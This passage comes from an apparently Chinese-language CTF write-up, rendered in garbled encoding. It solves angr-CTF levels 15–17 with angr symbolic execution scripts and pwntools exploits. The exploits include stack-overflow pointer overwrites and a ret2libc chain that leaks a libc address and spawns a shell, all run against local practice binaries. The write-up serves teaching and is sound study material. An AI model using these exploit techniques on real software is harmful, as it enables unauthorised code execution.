<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>    call_puts_addr = <span class="hljs-number">0x8049090</span><br>    <span class="hljs-keyword">if</span> state.addr != call_puts_addr:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    good_str_addr = <span class="hljs-number">0x58465157</span><br>    puts_param = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>,<br>                                   endness = proj.arch.memory_endness)<br>    <span class="hljs-keyword">if</span> state.solver.symbolic(puts_param):<br>        <span class="hljs-keyword">if</span> state.satisfiable(extra_constraints=(puts_param == good_str_addr,)):<br>            state.add_constraints(puts_param == good_str_addr)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>simgr.explore(find = is_success)<br></code></pre></td></tr></table></figure>



<p>å°†ä¸Šé¢çš„è¿›è¡Œæ•´åˆå°±æ˜¯æˆ‘ä»¬æœ€åçš„ exp äº†ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./15_angr_arbitrary_read&#x27;</span><br>    proj = angr.Project(bin_path)<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">MySimScanfProcedure</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, <span class="hljs-built_in">str</span>, key_addr, chr_arr_addr</span>):<br>            key_bvs = claripy.BVS(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>            chr_arr_bvs = claripy.BVS(<span class="hljs-string">&#x27;chr_arr&#x27;</span>, <span class="hljs-number">20</span> * <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> chr_arr_bvs.chop(bits = <span class="hljs-number">8</span>):<br>                self.state.add_constraints(ch &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, ch &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>            self.state.memory.store(key_addr, key_bvs,<br>                                    endness = proj.arch.memory_endness)<br>            self.state.memory.store(chr_arr_addr, chr_arr_bvs)<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_0&#x27;</span>] = key_bvs<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_1&#x27;</span>] = chr_arr_bvs<br><br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, MySimScanfProcedure())<br><br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>        call_puts_addr = <span class="hljs-number">0x8049090</span><br>        <span class="hljs-keyword">if</span> state.addr != call_puts_addr:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        good_str_addr = <span class="hljs-number">0x58465157</span><br>        puts_param = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>,<br>                                       endness = proj.arch.memory_endness)<br>        <span class="hljs-keyword">if</span> state.solver.symbolic(puts_param):<br>            copy_state = state.copy()<br>            copy_state.add_constraints(puts_param == good_str_addr)<br>            <span class="hljs-keyword">if</span> copy_state.satisfiable():<br>                state.add_constraints(puts_param == good_str_addr)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    simgr.explore(find = is_success)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        solution_0 = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_0&#x27;</span>])<br>        solution_1 = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_1&#x27;</span>],<br>                                                cast_to=<span class="hljs-built_in">bytes</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_0))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_1))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯æˆåŠŸè¾“å‡º <code>&quot;Good Job.&quot;</code>ï¼š</p>
<p><img src="https://s2.loli.net/2022/11/30/oL6Nn2hpgq5PmHz.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="16-angr-arbitrary-writeï¼šæ ˆæº¢å‡ºå˜é‡è¦†ç›–"><a href="#16-angr-arbitrary-writeï¼šæ ˆæº¢å‡ºå˜é‡è¦†ç›–" class="headerlink" title="16_angr_arbitrary_writeï¼šæ ˆæº¢å‡ºå˜é‡è¦†ç›–"></a>16_angr_arbitrary_writeï¼šæ ˆæº¢å‡ºå˜é‡è¦†ç›–</h2><p>è¿˜æ˜¯æƒ¯ä¾‹åœ°æ‹–å…¥ IDAï¼Œæœ¬é¢˜é€»è¾‘ä¸»è¦æ˜¯è¯»å…¥è¾“å…¥ååˆ¤æ–­ key æ˜¯å¦æ˜¯ <code>10225924</code>ï¼Œè‹¥æ˜¯åˆ™æ‹·è´å­—ç¬¦ä¸² <code>s</code> åˆ° <code>dest</code> æ‰€æŒ‡å­—ç¬¦ä¸²ï¼Œå¦åˆ™æ‹·è´åˆ° <code>unimporttant_buffer</code>ï¼Œæœ€ååˆ¤æ–­ <code>password_buffer</code> æ˜¯å¦ä¸º <code>&quot;UEQFKBEC&quot;</code>ï¼Œè‹¥æ˜¯åˆ™è¾“å‡º <code>&quot;Good Job.&quot;</code> å­—ç¬¦ä¸²ï¼š</p>
<p><img src="https://s2.loli.net/2022/11/30/FHCbNrcSz8YliIU.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å’Œä¸Šä¸€é¢˜ç±»ä¼¼ï¼Œæœ¬é¢˜çš„è¾“å…¥è¯»å…¥åŒæ ·å­˜åœ¨ä¸€ä¸ªæº¢å‡ºï¼Œå¯ä»¥è®©æˆ‘ä»¬è¦†ç›–åˆ° <code>dest</code> ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯è‹¥æ˜¯å°† <code>dest</code> è¦†ç›–ä¸º <code>password_buffer</code> çš„åœ°å€ï¼Œä¾¿èƒ½ç›´æ¥è¦†å†™å…¶ä¸­çš„å†…å®¹</p>
<p>äºæ˜¯æœ€åçš„ exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./16_angr_arbitrary_write&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;10225924 &quot;</span> + <span class="hljs-string">b&quot;UEQFKBEC&quot;</span> + <span class="hljs-string">b&quot;arttnba3&quot;</span> + p32(<span class="hljs-number">0x58465148</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯è·å¾— <code>&quot;Good Job.&quot;</code> </p>
<p><img src="https://s2.loli.net/2022/12/02/RjGDpmMz5go3QrN.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>â€”â€”ä½†è¿™å¹¶ä¸æ˜¯æˆ‘ä»¬åšè¿™ä¸€é“é¢˜çš„ç›®çš„ï¼Œæˆ‘ä»¬åº”å½“ä½¿ç”¨ angr æ¥æ±‚è§£ï¼šï¼‰</p>
<p>é‚£ä¹ˆç”¨ angr è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿè¿™é¢˜å…¶å®å’Œä¸Šä¸€é“é¢˜æœ¬è´¨ä¸Šæ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥é€šè¿‡ hook scanf çš„æ–¹å¼æ¥å°†æˆ‘ä»¬çš„è¾“å…¥ç¬¦å·åŒ–ï¼Œä¹‹ååœ¨ <code>explore()</code> ä¸­è®¾ç½®ä¸€ä¸ªåœ¨ <code>strncpy()</code> ä¸Šè¿›è¡Œåˆ¤æ–­çš„å‡½æ•°â€”â€”åˆ¤æ–­å…¶ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¦ä¸º <code>password_buffer</code>ã€ç¬¬äºŒä¸ªå‚æ•°æ˜¯å¦ä¸º <code>&quot;UEQFKBEC&quot;</code> å³å¯</p>
<p>æœ€ç»ˆçš„è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&quot;./16_angr_arbitrary_write&quot;</span><br>    proj = angr.Project(bin_path)<br><br>    <span class="hljs-comment"># hook the scanf to symbolize our input</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimScanfProcedure</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, fmtstr, key_addr, chr_arr_addr</span>):<br>            key_bvs = claripy.BVS(<span class="hljs-string">&#x27;key_bvs&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>            chr_arr_bvs = claripy.BVS(<span class="hljs-string">&#x27;chr_arr_bvs&#x27;</span>, <span class="hljs-number">20</span> * <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">for</span> <span class="hljs-built_in">chr</span> <span class="hljs-keyword">in</span> chr_arr_bvs.chop(bits = <span class="hljs-number">8</span>):<br>                self.state.add_constraints(<span class="hljs-built_in">chr</span> &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-built_in">chr</span> &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>            self.state.memory.store(key_addr, key_bvs, <br>                                    endness = proj.arch.memory_endness)<br>            self.state.memory.store(chr_arr_addr, chr_arr_bvs)<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;key_val&#x27;</span>] = key_bvs<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;chr_arr_val&#x27;</span>] = chr_arr_bvs<br>            <br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, SimScanfProcedure())<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>        strncpy_plt = <span class="hljs-number">0x80490F0</span><br>        <span class="hljs-keyword">if</span> state.addr != strncpy_plt:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        strncpy_param1 = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <br>                                           endness = proj.arch.memory_endness)<br>        strncpy_param2 = state.memory.load(state.regs.esp + <span class="hljs-number">8</span>, <span class="hljs-number">4</span>,<br>                                          endness = proj.arch.memory_endness)<br>        first_8_chr = state.memory.load(strncpy_param2, <span class="hljs-number">8</span>)<br>        password_buffer_addr = <span class="hljs-number">0x58465148</span><br><br>        <span class="hljs-keyword">if</span> state.solver.symbolic(strncpy_param1) <span class="hljs-keyword">and</span> state.solver.symbolic(first_8_chr):<br>            copy_state = state.copy()<br>            copy_state.add_constraints(strncpy_param1 == password_buffer_addr)<br>            copy_state.add_constraints(first_8_chr == <span class="hljs-string">b&#x27;UEQFKBEC&#x27;</span>)<br>            <span class="hljs-keyword">if</span> copy_state.satisfiable():<br>                state.add_constraints(strncpy_param1 == password_buffer_addr)<br>                state.add_constraints(first_8_chr == <span class="hljs-string">b&#x27;UEQFKBEC&#x27;</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = is_success)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        key_val = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;key_val&#x27;</span>])<br>        chr_arr_val = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;chr_arr_val&#x27;</span>],<br>                                                cast_to=<span class="hljs-built_in">bytes</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(key_val))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(chr_arr_val))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯è·å¾— <code>&quot;Good Job.&quot;</code></p>
<p><img src="https://s2.loli.net/2022/12/02/LeEl7WNBb3iwxtj.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>ç¬”è€…æ„Ÿè§‰è¿™ä¸¤é¢˜åŸºæœ¬ä¸Šä¸€æ¨¡ä¸€æ ·â€¦ä¸çŸ¥é“ä¸ºå•¥ç‰¹åœ°åˆ†æˆä¸¤é“é¢˜-  -</p>
</blockquote>
<h2 id="17-angr-arbitrary-jumpï¼šæ ˆæº¢å‡ºåŠ«æŒæ§åˆ¶æµ"><a href="#17-angr-arbitrary-jumpï¼šæ ˆæº¢å‡ºåŠ«æŒæ§åˆ¶æµ" class="headerlink" title="17_angr_arbitrary_jumpï¼šæ ˆæº¢å‡ºåŠ«æŒæ§åˆ¶æµ"></a>17_angr_arbitrary_jumpï¼šæ ˆæº¢å‡ºåŠ«æŒæ§åˆ¶æµ</h2><p>angr-CTF çš„æœ€åä¸€é“é¢˜äº†ï¼Œè¿˜æ˜¯æƒ¯ä¾‹æ‹–å…¥ IDA ä¸­ï¼Œè¿™ä¸€æ¬¡çš„æ ¸å¿ƒé€»è¾‘åœ¨ <code>read_input()</code> å½“ä¸­ï¼Œè€Œè¯¥å‡½æ•°ä»…ä¸ºä¸€ä¸ªç®€å•çš„ <code>&quot;%s&quot;</code> æº¢å‡ºï¼š</p>
<p><img src="https://s2.loli.net/2022/12/02/YmoRpJWTil4tvHB.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://s2.loli.net/2022/12/02/xAenrIhSkwaDo2E.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>checksec ä¸€ä¸‹ï¼Œåªå¼€äº†ä¸€ä¸ª NXï¼š</p>
<p><img src="https://s2.loli.net/2022/12/02/Qh78ie42x5PGnIT.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ç›´æ¥æ‰“ä¸€å¥— ret2libc ç»„åˆæ‹³ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    p = process(<span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span>)<br>    e = ELF(<span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span>)<br>    libc = ELF(<span class="hljs-string">&quot;/usr/lib/i386-linux-gnu/libc-2.31.so&quot;</span>)<br><br>    payload1 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x19</span> + p32(<span class="hljs-number">0xdeadbeef</span>)<br>    payload1 += p32(e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p32(e.sym[<span class="hljs-string">&#x27;read_input&#x27;</span>])<br>    payload1 += p32(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>    p.sendline(payload1)<br><br>    p.recvuntil(<span class="hljs-string">b&#x27;Enter the password: &#x27;</span>)<br>    puts_got = u32(p.recv(<span class="hljs-number">4</span>))<br>    log.success(<span class="hljs-string">&quot;puts got:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_got)))<br>    libc_base = puts_got - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>    bin_sh_addr = libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>).__next__()<br>    log.success(<span class="hljs-string">&quot;libc base:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>    log.success(<span class="hljs-string">&quot;bin_sh:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base + bin_sh_addr)))<br><br>    payload2 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x19</span> + p32(<span class="hljs-number">0xdeadbeef</span>)<br>    payload2 += p32(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>    payload2 += p32(<span class="hljs-number">0xdeadbeef</span>)<br>    payload2 += p32(libc_base + bin_sh_addr)<br>    p.sendline(payload2)<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ Get shellï¼š</p>
<p><img src="https://s2.loli.net/2022/12/02/ZTDsOjkgU459GKx.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>â€”â€”ä½†åœ¨ angr-CTF ä¸­å®é™…ä¸Šè¦æ±‚æˆ‘ä»¬è¾“å‡ºçš„æ˜¯ <code>&quot;Good Job.&quot;</code> å­—ç¬¦ä¸²ï¼š(</p>
<p>é‡æ–°å†çœ‹ä¸€ä¸‹ IDAï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªåä¸º <code>print_good()</code> çš„å‡½æ•°ï¼Œå…¶ä¼šè¾“å‡º <code>&quot;Good Job.&quot;</code> å­—ç¬¦ä¸²</p>
<p><img src="https://s2.loli.net/2022/12/02/ws5VH6UWhFoT9ye.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥å°†è¿”å›åœ°å€è¦†ç›–ä¸ºè¯¥å‡½æ•°å³å¯ï¼Œexp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x19</span> + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(<span class="hljs-number">0x58465168</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯è·å¾— <code>&quot;Good Job.&quot;</code> </p>
<p><img src="https://s2.loli.net/2022/12/02/KwuMV92WDmxNqQg.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>â€”â€”ä½†è¿™å¹¶ä¸æ˜¯æˆ‘ä»¬åšè¿™ä¸€é“é¢˜çš„ç›®çš„ï¼Œæˆ‘ä»¬åº”å½“ä½¿ç”¨ angr æ¥æ±‚è§£ï¼šï¼‰</p>
<p>é‚£ä¹ˆç”¨ angr è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿé¦–å…ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥åˆ©ç”¨ SimProcedure æ¥ hook scanf ä»¥å°†è¾“å…¥ç¬¦å·åŒ–ï¼Œç”±äºè¾“å…¥å­˜åœ¨æº¢å‡ºï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å‡è£…ä¸çŸ¥é“è¾“å…¥åˆ°æ ˆåº•çš„è·ç¦»ï¼Œç›´æ¥å°†ç¬¦å·åŒ–è¾“å…¥è®¾ä¸ºä¸€ä¸ªè¾ƒå¤§é•¿åº¦ï¼Œè‹¥æ— è§£å†ç»§ç»­å¢é•¿å³å¯</p>
<p>ä½†è¿™é‡Œæˆ‘ä»¬éœ€è¦å®Œæˆçš„æ˜¯åˆ©ç”¨æ ˆæº¢å‡ºæ¥æ§åˆ¶ç¨‹åºè¿›è¡Œè·³è½¬ï¼Œå¯¹äº angr è€Œè¨€è¿™æ ·çš„çŠ¶æ€æ˜¯<strong>ä¸å—çº¦æŸçš„çŠ¶æ€</strong>ï¼ˆ<strong>unconstrained state</strong>ï¼‰ï¼Œ<strong>ä¼šè¢«è‡ªåŠ¨ä¸¢å¼ƒ</strong>ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦æƒ³åŠæ³•è®© angr ä¿ç•™è¿™æ ·çš„çŠ¶æ€</p>
<h3 id="angr-stash"><a href="#angr-stash" class="headerlink" title="angr stash"></a>angr stash</h3><p>åœ¨ angr å½“ä¸­ï¼Œä¸åŒçš„çŠ¶æ€è¢«ç»„ç»‡åˆ° simulation manager çš„ä¸åŒçš„ stash å½“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‰ç…§è‡ªå·±çš„éœ€æ±‚è¿›è¡Œæ­¥è¿›ã€è¿‡æ»¤ã€åˆå¹¶ã€ç§»åŠ¨ç­‰</p>
<h4 id="â‘ -stash-ç±»å‹"><a href="#â‘ -stash-ç±»å‹" class="headerlink" title="â‘  stash ç±»å‹"></a>â‘  stash ç±»å‹</h4><p>åœ¨ angr å½“ä¸­ä¸€å…±æœ‰ä»¥ä¸‹å‡ ç§ stashï¼š</p>
<ul>
<li><code>simgr.active</code>ï¼šæ´»è·ƒçš„çŠ¶æ€åˆ—è¡¨ã€‚åœ¨æœªæŒ‡å®šæ›¿ä»£çš„æƒ…å†µä¸‹ä¼šè¢«æ¨¡æ‹Ÿå™¨é»˜è®¤æ‰§è¡Œ</li>
<li><code>simgr.deadended</code>ï¼šæ­»äº¡çš„çŠ¶æ€åˆ—è¡¨ã€‚å½“ä¸€ä¸ªçŠ¶æ€æ— æ³•å†è¢«ç»§ç»­æ‰§è¡Œæ—¶ï¼ˆä¾‹å¦‚æ²¡æœ‰æœ‰æ•ˆæŒ‡ä»¤ã€æ— æ•ˆçš„æŒ‡ä»¤æŒ‡é’ˆã€ä¸æ»¡è¶³å…¶æ‰€æœ‰çš„åç»§ï¼ˆsuccessorsï¼‰ï¼‰ä¾¿ä¼šè¢«å½’å…¥è¯¥åˆ—è¡¨</li>
<li><code>simgr.pruned</code>ï¼šè¢«å‰ªæçš„çŠ¶æ€åˆ—è¡¨ã€‚åœ¨æŒ‡å®šäº† <code>LAZY_SOLVES</code> æ—¶ï¼ŒçŠ¶æ€ä»…åœ¨å¿…è¦æ—¶æ£€æŸ¥å¯æ»¡è¶³æ€§ï¼Œå½“ä¸€ä¸ªçŠ¶æ€åœ¨æŒ‡å®šäº† <code>LAZY_SOLVES</code> æ—¶è¢«å‘ç°æ˜¯ä¸å¯æ»¡è¶³çš„ï¼ˆunsatï¼‰ï¼ŒçŠ¶æ€å±‚ï¼ˆstate hierarchyï¼‰å°†ä¼šè¢«éå†ä»¥ç¡®è®¤åœ¨å…¶å†å²ä¸­æœ€åˆå˜ä¸ºä¸æ»¡è¶³çš„æ—¶é—´ï¼Œè¯¥ç‚¹åŠå…¶æ‰€æœ‰åä»£éƒ½ä¼šè¢«  <em>å‰ªæ</em>  ï¼ˆprunedï¼‰å¹¶æ”¾å…¥è¯¥åˆ—è¡¨</li>
